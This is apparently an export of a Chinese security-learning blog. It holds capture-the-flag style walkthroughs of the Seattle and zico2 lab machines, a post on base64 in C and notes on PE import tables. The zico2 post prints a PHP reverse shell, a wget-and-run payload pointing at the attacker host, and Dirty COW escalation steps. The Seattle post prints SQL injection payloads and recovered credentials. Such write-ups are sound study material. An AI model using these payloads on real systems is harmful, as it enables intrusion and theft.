[{"title":"Seattle靶机实验","url":"/2023/09/11/Seattle%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/","content":"一.实验环境kali：192.168.43.140\n靶机：目前未知\n二.实验流程信息收集——主机发现\n信息收集——端口扫描\n渗透测试\n三.实验步骤3.1信息收集——主机发现netdiscover -i eth0 -r 192.168.43.0/24\n\n我们可以猜测出目的主机是192.168.43.147\n3.2信息收集——端口扫描3.2.1扫描端口masscan --rate=10000 --ports 0-65535 192.168.43.143\n3.2.2详细的端口扫描nmap 192.168.43.147 -sV -T4 -O -p 80\n\n3.2.3页面在My Account分页里找到了登录页面，不论尝试弱口令或者尝试sql注入都失败了，寻找其他的可注入点。\n\n我们在Vinyl中发现了可控的参数，尝试sql注入，结果跳转到正确的页面中\n\n我们继续往下查看发现新的可控参数prod，我们尝试输入  ‘  发现报错\n\n3.3渗透测试3.3.1注入类型判断根据上一句报错显示内容可以知道，这里大概率是没有闭合符的，通过and 1&#x3D;1   and 1&#x3D;2验证也越是如此，是数字型注入，这里就不贴图了\n3.3.2查找回显通过order by可以确定这里查询的字段数量位5个\n\n\n这里发现联合查询没有回显，应该是这里只能显示一个商品\n\n我们让sql语句查询不到商品看看是否有回显\n可以看到这里的回显点是3和5，接下来在这里进行信息泄露就可以了\n\n数据库名称叫做seattle\n\n3.3.3敏感信息泄露我们使用以下语句尝试爆出更多数据\nprod=0 union select 1,2,3,4,group_concat(table_schema,&#39;~&#39;,table_name) from information_schema.tables where table_schema = database() \n数据seattle~tblBlogs,seattle~tblMembers,seattle~tblProducts\n\nMySQL自带的数据库information_schema是mysql数据库中自带的数据库，其中的数据库的表单信息包含了本机mysql数据库相关的所有信息，比如本语句中的information_schema.tables表。information_schema.tables表中的table_schema记录了数据库名称；table_name记录了对应数据库下的表名我们通过information_schema.table可以查询到本机中包含哪些数据库，也可以查询到对应数据库中有那些表\n\n\n\n我们可以看到在seattle数据库下有tblMembers这个表，基本上可以确定这里是用户登录的表\n\n我们使用下面的语句查看tblMembers中的字段名\nprod=0 union select 1,2,3,4,group_concat(table_name,&#39;~&#39;,column_name) from information_schema.columns where table_name= &#39;tblMembers&#39; \n数据tblMembers~id,tblMembers~username,tblMembers~password,tblMembers~session,tblMembers~name,tblMembers~blog,tblMembers~admin\n\nMySQL自带的数据库information_schema.columns表中的table_name记录了本机所有的表明，column_name记录了对应表名中的字段名通过information_schema.columns我们获取表中的字段名，使得我们不需要猜测就可以精准查找信息\n\n\n我们继续爆出相关用户信息\nprod=0 union select 1,2,3,4,group_concat(username,&#39;~&#39;,password) from tblMembers\n数据admin@seattlesounds.net~Assasin1\n\n\n这里我们就成功登录进去了\n\n四.实验总结在拿到一个网页时，应该多尝试点击，以及尝试可以看到的url链接中的参数，当所有的都尝试过后再放弃而不是简单尝试了两个后就寻求帮助。\n 这次的sql注入是通过union联合查询来进行注入。在做后台时可以通过禁用union词来做到禁止这种的攻击方式。\n","tags":["Seattle，SQL注入，information_schema"]},{"title":"zico2靶机实验","url":"/2023/09/11/zico2%E9%9D%B6%E6%9C%BA%E5%AE%9E%E9%AA%8C/","content":"一实验环境靶机：zico2，IP地址暂时未知；\n测试机：kali，IP地址：192.168.43.140；\n二实验流程信息收集——主机发现\n信息收集——端口扫描\n渗透测试\n三实验步骤3.1信息收集——主机发现3.1.1扫描主机（nerdiscover）-i 指定网卡 -r指定网段\nsudo netdiscover -i eth0 -r 192.168.43.0/24\n\n对方主机应该是 192.168.43.143\n3.2信息收集——端口扫描3.2.1扫描端口（masscan）sudo masscan --rate=10000 --ports 0-65535 192.168.43.143\n\n目标机器开放了111，22，34560端口\n3.2.2详细端口扫描（namp）sudo nmap 192.168.43.143 -sV -T4 -O -p 111,34560,22\n\n22 ssh；111 rpcbind；34560 status\n3.3渗透测试3.3.1访问对方http信息通过查看页面寻找有用信息\n?page=    猜测可能有文件包含漏洞\n\n直接将page后的内容修改无法查看到&#x2F;etc&#x2F;passwd的内容\n查看到../../../../etc/passwd内容\n\n该网站存在文件包含漏洞；如果不能直接查看到/etc/passwd下的内容，可能是因为默认的目录没有在根目录下，可以采用../../../../的方式，使其返回到根目录下；了解到该网站存在文件包含的漏洞，接下来就需要去寻找网站可以访问的目录，利用文件包含漏洞；\n\n\n\n3.3.2目录扫描（dirb）sudo dirb http://192.168.43.143\n\n可以查看到/css/;/dbamin/;/img/;/js/;/vendor/等目录\n\n3.3.3查看访问到的目录访问该页面下的test_db.php\n\n进入数据库测试页面,通过页面显示可以获取一些信息phpLiteAdmin的版本\n\n查询phpLiteAdmin对应版本漏洞\nsearchsploit phpLiteAdmin\n查询到1.9.3版本有远程注入漏洞\n\n尝试登录数据库\nadmin弱口令尝试登陆成功\n\n3.3.4查看数据库敏感信息得到两个账号的登录密码\n\n用在线md5碰撞尝试找到密码\nroot——34kroot34\nzico——zico2215@\n\n\n3.3.5尝试ssh远程链接两个用户都无法链接成功\n\n\n3.3.6.1命令注入漏洞和文件包含漏洞的利用的测试创建数据库test_db；创建彪test_table\n写入信息\n测试代码&lt;?phpphpinfo()?&gt;\n\n\n进行访问phpinfo()的测试\n\n3.3.6.2命令注入漏洞和文件包含漏洞的利用创立一个test数据库；创立一个shell的表；\n添加数据\n数据库内容&lt;?php     system(&quot;wget 192.168.43.140/shell.txt -O /tmp/shell.php;    php /tmp/shell.php&quot;);?&gt;    #通过system()命令执行wget命令将kali上的shell.txt文件保存到指定目录下的shell.php    #执行保存下的shell.php\n\n\n在kali上写一个shell.txt保存在&#x2F;var&#x2F;www&#x2F;html中\n执行apache2让靶机可以下载shell.txt\nshell.txt&lt;?php    $sock=fsockopen(&quot;192.168.43.140&quot;,1234);\texec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);?&gt;\t#fsockopen()与192.168.43.140:1234建立一个链接\t#exec()通过&#x27;/bin/sh -i&#x27;启动一个交互式的shell    #‘&lt;&amp;3’&#x27;&gt;&amp;3&#x27;&#x27;2&gt;&amp;3&#x27;三个分别输入、输出和错误流定位到远程链接上\n\n\n监听端口1234\nsudo nc -nvlp 1234\n开启监听后访问192.168.43.143/view.php?page=../../../../usr/databases/test\n访问后执行数据库中的命令\nwhoami可以看到当前用户是www-data，当前所在的目录是&#x2F;var&#x2F;www，linux内核是3.2.0\n\n执行命令python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;#通过pty产生一个新的bash shell\n\n\n3.3.7脏牛提权sudo searchspoit linux cow\n查找脏牛提权脚本\n\n将提权脚本移到http服务的目录下\nlinux执行命令cd /usr/share/exploitdb/exploits/linux/localsudo cp 40839.c /var/www/htmlcd /var/www/htmlmv 40839.c dirty.csudo python -m http.server 8080\n\n操控靶机下载编译并执行提权脚本\nlinux执行命令wget 192.168.43.140:8080/dirty.cgcc -pthread dirty.c -o exo -lcrypt./exp\n\n\n执行提权脚本\n\n进入特权模式\n\n访问&#x2F;etc&#x2F;passwd查看\nroot用户被firefart替代\n\n3.3.8查看其他用户的文件发现zico用户下的网站管理系统\n\n\nwp-config.php 文件是WordPress数据库的关键。数据库名、用户名、密码、位置都是在此设置。\n查看wp-config.php文件\n通过查看wp-config.php文件获取到用户名和密码\nzico  sWfCsfJSPV9H3AmQzw8\n\n尝试进行ssh远程链接\n\n成功登录\n四实验总结如果看到页面可能存在文件包含漏洞，可以使用..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的方式去尝试；\n当渗透进系统时，可以查看其它用户的家目录下有什么可以利用的信息；\n最后感谢靶机渗透测试实战（六）——Zico2渗透实战_橘子女侠的博客-CSDN博客的博客让我一个新手小白能够从头打靶到最后。\n","tags":["zico2"]},{"title":"base64的C语言实现及原理","url":"/2023/07/10/base64%E7%9A%84C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%8F%8A%E5%8E%9F%E7%90%86/","content":"BASE64编码原理　　 base64是一种编码方式，将ASICC码转换为可见的65种可见字符*(编码表中有64个字符，同时还有一个‘&#x3D;’用来做标识)。\n　　base64ASICC的编码所使用的大小为1字节也就是8bit，8bit转化为64的方法就是使用6bit，取6和8的最小公倍数24.也就是3个字节为一组可以转化为4个base64编码。\n　　首先将3个字节转化为2进制排在一起，然后每六个划分为一组。每一组转化为十进制在base64编码表中查找下标对应的字符就得到了转化后的字符。如图所示为ABC的编码过程，结果为QUJD。\n\n　　既然是三个字节为一组，那问题来了，如果不足三个字节怎么办？这时就要用到base64的特殊字符‘&#x3D;’了。在不足三维的情况下，前面的编码过程是一样的，到了转化为十进制时便有了些许差异。具体如图。\n\n\n　　请注意用红色标注出来的地方，当只剩一个字节时，我们在正常编码的情况下，将多余的2bit放在新的字符的前两个bit的位置上，剩下4bite由0来填充。在编码后我们又加入了两个‘&#x3D;’。当只剩两字节时也是一样的操作在多的4bit后加上2bit的0，并且再最后补上一个‘&#x3D;’。\nbase64的c语言实现输入输出　　 c语言是没有办法直接创建动态数组的，其他人解决动态数组的方法是使用mallac等函数，需要事先确定输入的长度，但我并不想将这一麻烦的问题交给我的代码使用者——我自己，在我的一番学习下，没能完美的解决自动分配给输入输出合适的内存。\n　　后来我的解决方法是采用文件输入输出的方式来解决内存分配问题(这样就不需要解决问题)。\n　　在我测试的时候发现了一个bug，就是当你某次的输出长度没有上一次多时便会将上一次的“残留”也输出出来，而输入不会，因此我们可以像处理输入一样处理输出——在加密完成时添加一个’\\n’来标志结束。当然代码可能提前终止，但这并不需要考虑，因为base64标准表中并没有’\\n’字符。\n 1 //输入 2 void getcode() &#123; 3     FILE* fpin = fopen(&quot;./1.txt&quot;, &quot;r+&quot;); 4     char in = 0; 5     while (in != &#x27;\\n&#x27;) 6     &#123; 7         in = getchar(); 8         fputc(in, fpin); 9     &#125;10     fclose(fpin);11 &#125;12 //输出13 void putcode() &#123;14     FILE* fpout = fopen(&quot;./2.txt&quot;, &quot;r+&quot;);15     char b;16     while (1)17     &#123;18         b = fgetc(fpout);19         if (b==&#x27;\\n&#x27;)20             break;21         printf(&quot;%c&quot;, b);22     &#125;23     fclose(fpout);24 &#125;\n\n加密代码思路　　 用c语言实现的首要问题是如何将8bit巧妙地转化为6bit，这里采用的是对每一个字符进行位操作。\n　　第一个字符&gt;&gt;2便可得到第一个加密字符；第一个字符&lt;&lt;4后加上第二个字符&gt;&gt;4去掉前两位得到第二个加密字符；第二个字符&lt;&lt;2加上第三个字符&gt;&gt;6去掉前两位得到第三个加密字符；第三个字符去掉前两位得到第四个加密字符。\n1 text[0] = table[(a[0] &gt;&gt; 2)];2 text[1] = table[(a[0] &lt;&lt; 4) + (a[1] &gt;&gt; 4) % 64];3 text[2] = table[(a[1] &lt;&lt; 2) + (a[2] &gt;&gt; 6) % 64];4 text[3] = table[a[2] % 64];\n\n　　这里采用%64的方法与+的方法，但是这样做的效果并不好,最终的加密结果与正确的不符。原因是当进行&lt;&lt;操作时并不会把char类型的超出1字节的部分丢弃掉，这就导致了再+的操作时会加上一个不正确的数。\n　　在学习了他人的代码后，我觉得确实是别人的算法比较精明。\n　　用到的位操作有&lt;&lt;、&gt;&gt;、|、&amp;这四种位操作。当进行&lt;&lt;操作时，会再地位补0；当进行&gt;&gt;操作时，若有符号数，最高位为1则最高位补1，为0则补0，若为无符号数，最高位补0；当进行&amp;操作时，当对应位为1时则为1，常用于归零；当进行|操作时，有1则为1。\n1 text[0] = table[(a[0] &gt;&gt; 2)];2 text[1] = table[((a[0] &amp; 3) &lt;&lt; 4) | (a[1] &gt;&gt; 4)];3 text[2] = table[((a[1] &amp; 0xF) &lt;&lt; 2) | (a[2] &gt;&gt; 6)];4 text[3] = table[a[2] &amp; 0x3F];\n\n　　第一位加密字符方法不变；第二位加密字符由第一个字符&amp;3后进行&lt;&lt;4操作然后|第二个字符&gt;&gt;4的值；第三位加密字符由第二个字符&amp;0xF后进行&lt;&lt;2操作然后|第二个字符&gt;&gt;6的值；第四位加密字符由第三个字符&amp;0x3F得到。\n　　因为&gt;&gt;操作确实会丢掉一部分bit而&lt;&lt;操作不会，因此进行&lt;&lt;操作时会进行&amp;操作，只留下需要的位数；同时，原本+的方式改为了|这样可以加快计算速度。\n　　当加密字符为1个时，第一位加密字符方法不变；第二位加密字符由第一个字符&amp;3后进行&lt;&lt;4，第三个和第四个加密字符均为’&#x3D;’。\n　　当加密字符为2个时，第一位加密字符方法不变；第二位加密字符由第一个字符&amp;3后进行&lt;&lt;4操作然后|第二个字符&gt;&gt;4的值；第三位加密字符由第二个字符&amp;0xF后进行&lt;&lt;2，第四个加密为’&#x3D;’。\n加密代码 1 void base64encode() &#123; 2     FILE* fpout = fopen(&quot;./2.txt&quot;, &quot;r+&quot;); 3     FILE* fpin = fopen(&quot;./1.txt&quot;, &quot;r+&quot;); 4     char a[4]=&#123;&#125;; 5     int flag=0; 6     char text[5] = &#123;&#125;; 7     while (1) 8     &#123; 9         //输入判断10         fgets(a, 4, fpin);11         if (a[0] == &#x27;\\n&#x27; || a[0] == 0)12         &#123;13             fputc(&#x27;\\n&#x27;, fpout);14             break;15         &#125;16         if (a[1] == &#x27;\\n&#x27; || a[1] == 0)17             flag = 1;18         if (a[2] == &#x27;\\n&#x27; || a[2] == 0)19             flag = 2;20         //加密21         if (flag == 1)22         &#123;23             text[0] = table[(a[0] &gt;&gt; 2) % 64];24             text[1] = table[((a[0] &amp; 3) &lt;&lt; 4)];25             text[2] = &#x27;=&#x27;;26             text[3] = &#x27;=&#x27;;27             fputs(text, fpout);28             fputc(&#x27;\\n&#x27;, fpout);29             break;30         &#125;31         if (flag == 2)32         &#123;33             text[0] = table[(a[0] &gt;&gt; 2) % 64];34             text[1] = table[((a[0] &amp; 3) &lt;&lt; 4) | ((a[1] &amp; 0xF0) &gt;&gt; 4)];35             text[2] = table[(a[1] &amp; 0xF) &lt;&lt; 2];36             text[3] = &#x27;=&#x27;;37             fputs(text, fpout);38             fputc(&#x27;\\n&#x27;, fpout);39             break;40         &#125;41         text[0] = table[(a[0] &gt;&gt; 2)];42         text[1] = table[((a[0] &amp; 3) &lt;&lt; 4) | (a[1] &gt;&gt; 4)];43         text[2] = table[((a[1] &amp; 0xF) &lt;&lt; 2) | (a[2] &gt;&gt; 6)];44         text[3] = table[a[2] &amp; 0x3F];45         //输出46         fputs(text, fpout);47     &#125;48     fclose(fpin);49     fclose(fpout);50 &#125;\n\n\n\n解密代码思路　　 解密的思路就是与加密的思路相反。\n　　第一个解密字符是第一个加密字符&lt;&lt;2后|第二个加密字符&gt;&gt;4；第二个解密字符是第二个加密字符&amp;0x3F后&lt;&lt;4然后|第三个加密字符&gt;&gt;2；第三个解密字符是第三个加密字符&amp;3&lt;&lt;6|第四个加密字符。\n　　当有两个’&#x3D;’时，第一个解密字符是第一个加密字符&lt;&lt;2后|第二个加密字符&gt;&gt;4。\n　　当有一个’&#x3D;’时，第一个解密字符是第一个加密字符&lt;&lt;2后|第二个加密字符&gt;&gt;4；第二个解密字符是第二个加密字符&amp;0x3F后&lt;&lt;4然后|第三个加密字符&gt;&gt;2。\n　　需要注意的是这里的加密字符是每一个加密字符在加密表中所对应的下表的位置。\n解密代码 1 void base64decode()  2 &#123; 3     FILE* fpout = fopen(&quot;./2.txt&quot;, &quot;r+&quot;); 4     FILE* fpin = fopen(&quot;./1.txt&quot;, &quot;r+&quot;); 5     //求下标的首部 6     char* base = strchr(table, &#x27;A&#x27;); 7     while (true) 8     &#123; 9         char a[5] = &#123;&#125;;10         char text[4] = &#123;&#125;;11         int flag = 0;12         fgets(a, 5,fpin);13         if (a[0] == &#x27;\\n&#x27;)14         &#123;15             fputc(&#x27;\\n&#x27;, fpout);16             break;17         &#125;18         //求每一位对应的下标19         for(int i=0;i&lt;4;i++)20         &#123;21             if (a[2] == &#x27;=&#x27;)22             &#123;23                 a[0] = strchr(table, a[0]) - table;24                 a[1] = strchr(table, a[1]) - table;25                 flag = 1;26                 break;27             &#125;28             if (a[3] == &#x27;=&#x27;)29             &#123;30                 a[0] = strchr(table, a[0]) - base;31                 a[1] = strchr(table, a[1]) - base;32                 a[2] = strchr(table, a[2]) - base;33                 flag = 2;34                 break;35             &#125;36             a[i] = strchr(table, a[i])- base;37         &#125;38         //解密39         if (flag == 1)40         &#123;41             text[0] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 6;42             fputs(text, fpout);43             fputc(&#x27;\\n&#x27;, fpout);44             break;45         &#125;46         if (flag == 2)47         &#123;48             text[0] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 6;49             text[1] = (a[1] &amp; 0x3F) &lt;&lt; 4 | a[2] &gt;&gt; 2;50             fputs(text, fpout);51             fputc(&#x27;\\n&#x27;, fpout);52             break;53         &#125;54         text[0] = a[0] &lt;&lt; 2 | a[1] &gt;&gt; 4;55         text[1] = (a[1] &amp; 0x3F) &lt;&lt; 4 | a[2] &gt;&gt; 2;56         text[2] = (a[2] &amp; 3) &lt;&lt; 6 | a[3];57 58         fputs(text, fpout);59     &#125;60     fclose(fpin);61     fclose(fpout);62 &#125;\n\n最后如果有问题可以通过邮箱联系我“&#x72;&#97;&#105;&#x6e;&#105;&#x6e;&#x6b;&#116;&#114;&#105;&#112;&#x40;&#x66;&#111;&#x78;&#109;&#97;&#105;&#x6c;&#x2e;&#x63;&#111;&#x6d;”。\n","tags":["C语言","BASE64","输入输出"]},{"title":"导出表","url":"/2023/07/28/%E5%AF%BC%E5%87%BA%E8%A1%A8/","content":""},{"title":"导入表","url":"/2023/07/10/%E5%AF%BC%E5%85%A5%E8%A1%A8/","content":"​\t\t本篇文章以《Windows PE权威指南》作为基础进行学习，结合自己的学习和理解写本篇博客。如有错误或更好的见解欢迎指出。\n导入表PE中的导入表PE导入表的定位以书附赠的代码HelloWorld.exe为例\n数据目录项IMAGE_DATA_DIRECTORY数据目录项于PE头标识的偏移量是78h,我们可以计算出数据目录项的起始位置在128h地址处\n\n\n根据数据目录项结构体和其描述可以知道，在130h处是导入表地址和大小，在1B8h处是导入函数地址表地址和大小。\n从PE头中可以读出导入表地址是0x00002010，导入表的大小是3Ch。导入函数地址表地址是0x00002000，导入函数地址表大小是10h。\n节表项IMAGE_SECTION_HEADER\n在数据目录项后紧跟的是节表项，根据节表项结构体我们可以读出这些信息。\n.rdata节区的尺寸是92h，节区的RVA地址是0x00002000，在文件中的偏移是0200h，在文件中的偏移是0600h。\n\n导入表定位根据获得的.rdata节区的数据可以知道，导入表和导入函数地址表位于该节区内，由此可以计算出对应的文件内偏移。导入表：0610h,导入函数地址表：0600h。\n导入表描述符IMAGE_IMPORT_DESCRIPTOR\n根据导入表描述符结构体我们可以获得其中一个导入表这些信息,桥10x00002054h，时间戳&amp;链表的前一个结构00000000，指向链接库名字的指针0x0000206A，桥2  0x00002008。\n\n导入表双桥结构\n桥1简写INT（import name table，不准确），导入函数名称表；桥2简写IAT（import address table，不准确），导入函数地址表。\nINT的第一个字段（好像只有一个字段）指向的是IMAGE_IMPORT_BY_NAME，然后是下一个导入函数的IMAGE_IMPORT_BY_NAME地址，然后是00000000h的结束标识符。\nIMAGE_IMPORT_BY_NAME\n这个结构体中只有两个成员，第一个是函数编号，第二个是函数名称字符串比如MessageBox。在这个信息结束后紧跟着的是该函数所在动态链接库的名称。\n桥2所指的内容目前来说和桥1所指相同。\n导入表的给出的每一块信息是一个DLL文件的相关信息，从INT、IAT到IMAGE_IMPORT_BY_NAME，都是以一个DLL文件整体导入的内容为模块来划分结束标识。\n在内存中的导入表在内存中导入表和文件中的除了IAT外没有任何不同。程序在加载如内存时，操作系统会将IAT指向的地址改为导入函数的入口地址。\n同一个DLL文件中的多个函数导入表前面关于双桥结构的内容都是基于本小节编写的。这里主要以指出其中的不同为重点。代码采用的是本书的LockTray.exe\n\nINT的地址为65Ch，内容为”0x0000208A,0x0000207C,0x0000206C,0x00000000“。对应的内容从66Ch开始，对应的英文内容分别是“00ABh,EnableWindow;00C8h,FindWindowA;022Dh,ShowWindow”。在这个IMAGE_IMPORT_BY_NAME结构后是对应这个DLL文件的名称“user32.dll”。\n然后是LockTray.exe在文件中与内存中的示意图。\n在文件中的示意图\n\n在内存中的示意图\n\n本小节最后至此，PE中的导入表部分就结束了，对应《Windows PE权威指南》的4.3节，关于本章导入表的更多内容正在学习。\n从PE头开始一步一步的定位到导入表和导入函数地址表，相较于对第三章的内容硬看，对于理解PE头部分的内容有不错的效果。\n对于4.1与4.2节的内容，我认为书上的内容，还是比较直白的，通体阅读下来并没有特别难以理解的地方，更多的对他的机制的了解，无需更细的去学。\n绑定导入表绑定导入表的机制这一段内容书上对于相关机制的介绍十分详细，这里只做见到的总结，便于理解。\n在“内存中的导入表”提到过在程序加载进内存的过程中，系统会将IAT指向的地址改为内存中导入函数的地址，这个过程会消耗一定的时间，如果提前做好这些工作就可以节省一些时间。绑定导入表的作用就是将已经提前修改好的导入表内容进行声明，这样就可以不做这部分工作了。\n需要注意的是不同的操作系统，DLL文件加载进入内存空间的地址是不一样的。在加载动态链接库时会检查这些地址是否合法，如果当前DLL文件的版本号和文件中的DLL版本号不同，则会重新进行IAT的修改工作，并将修改的记录保存在文件中。\n此外有些情况是没有桥1 INT这个结构的，那么这将导致无法完整绑定导入这个工作。在进行检查DLL版本问题时，因为在文件中INT和IAT是完全相同的，我们可以通过同时遍历两个表来确定每一个导入函数的对应内存中的地址，来进行检查。\n绑定导入表的定位以随书附赠的notepad.exe的程序为例。\n根据根据数据目录项的第12个可以得知绑定导入表的地址事“0x00000250”，大小为”0Ch“\n\n绑定导入表的数据结构从0x250开始便是绑定导入表相关的内容。\n\n我们从第一个来开始看“A2BD0248h”是时间戳，就是用来标志DLL文件版本与本机的版本是否相同的一个标识，然后是”0058h“这个指向DLL文件名称，这里的值是一个偏移量，相对于绑定导入表头的一个偏移量，根据计算我们可以得到指向DLL文件名称的地址“0250h+0058h&#x3D;02A8h”，根据这个地址我可以得知这里指向的DLL文件名称是“comdlg32.dll”。\n第三个字段的用处是用来指出紧跟着IMAGE_BOUND_IMPORT_DESCRIPTOR后面另一个结构体IMAGE_BOUND_FORWARDER_REF的个数。\n\n这个字段的设计意义是微软为了能够兼容不同版本DLL中同一函数在另一函数库中的情况。IMAGE_BOUND_FORWARDER_REF这个结构体的字段意义同IMAGE_BOUND_IMPORT_DESCRIPTOR一样，只是最后一个字段变为了保留字段。\n根据0x280这个IMAGE_BOUND_IMPORT_DESCRIPTOR来进行分析。首先时间戳“4802BDC6h”，然后是偏移量“00A3h”，然后是IMAGE_BOUND_FORWARDER_REF个数“0001h”，紧接着的就是“REF”这个结构体；时间戳是“4802BDC5h”，然后是偏移量“00B0h”。第一个偏移量指的是“0x2F3”这个地址“KERNEL32.dll”，第二个偏移量指的是“0x300”这个地址“NTDLL.DLL”。\n\n关于IMAGE_BOUND_FORWARDER_REF我通过询问CHATGPT后得到他关于这个字段是模块转发机制，他的机制是这样的。\n模块转发是一种动态链接库（DLL）加载和解析的机制，用于解决模块间的依赖关系和版本兼容性问题。当一个模块需要引用另一个模块的函数或符号时，而不直接依赖于特定的模块版本，模块转发提供了一种灵活的方式来实现这种依赖关系。\n下面是模块转发的基本机制：\n\n源模块（调用模块）：这是需要引用其他模块功能的模块，它包含对函数或符号的导入请求。源模块将导入请求发送到绑定导入表中。\n\n绑定导入表（Bound Import Table）：绑定导入表是源模块的一部分，其中记录了导入请求的相关信息。在绑定导入表中，源模块指定了需要从其他模块解析的函数或符号。\n\n转发目标模块：转发目标模块是源模块将导入请求转发给的模块。它包含了源模块所需的函数或符号的实现。转发目标模块通常是另一个独立的DLL，它被源模块作为依赖模块进行引用。\n\n运行时解析：当源模块被加载时，系统会检查绑定导入表中的转发信息。系统将导入请求转发到转发目标模块，即转发目标模块负责提供对应的函数或符号的实现。\n\n符号解析：在转发目标模块中，系统会解析源模块的导入请求，并提供对应函数或符号的实现。解析后的函数或符号会被返回给源模块，使得源模块可以调用转发目标模块的功能。\n\n\n通过模块转发，源模块可以将对其他模块的依赖关系委托给转发目标模块，从而实现对外部功能的访问或共享。这种机制提供了灵活性，使得模块之间可以相对独立地开发和维护，同时解决了依赖关系和版本兼容性的问题。\n总结需要注意的是，模块转发的具体实现和用法可能因操作系统、编译器和应用程序的不同而有所差异。这种机制的设计旨在提供一种可扩展和灵活的方式来管理模块间的关系。\n他这个字段是导入函数转发声明，当源模块被加载时，会检查导入表中的转发信息，向转发模块对需要的函数或符号进行解析。\n原模块中不含有需要解析的函数或符号的实现。\n本小节最后绑定导入表的内容相对较少，大概做个了解，理解绑定导入的机制即可。\n如果有问题可以通过邮箱联系我“&#114;&#97;&#105;&#x6e;&#105;&#110;&#107;&#x74;&#114;&#x69;&#112;&#64;&#102;&#111;&#120;&#x6d;&#x61;&#x69;&#108;&#x2e;&#x63;&#111;&#109;”。\n","tags":["Windows PE权威指南"]}]